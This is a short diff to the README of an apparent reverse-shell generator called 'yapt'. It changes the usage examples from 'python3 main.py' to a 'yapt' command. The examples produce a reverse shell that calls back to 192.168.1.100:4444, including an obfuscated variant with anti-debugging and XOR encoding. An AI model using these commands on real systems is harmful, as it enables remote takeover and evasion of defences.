@@ -47,11 +47,11 @@ python setup.py install
 ## Running ##
 Basic reverse shell:
 
-`python3 main.py --ip 192.168.1.100 --port 4444`
+`yapt --ip 192.168.1.100 --port 4444`
 
 Obfuscated version with multiple techniques:
 
-`python3 main.py --ip 192.168.1.100 --port 4444 --junk --obfuscate-path --anti-debug --rle --xor-key 0xAA`
+`yapt --ip 192.168.1.100 --port 4444 --junk --obfuscate-path --anti-debug --rle --xor-key 0xAA`
 
 ## License ##
 
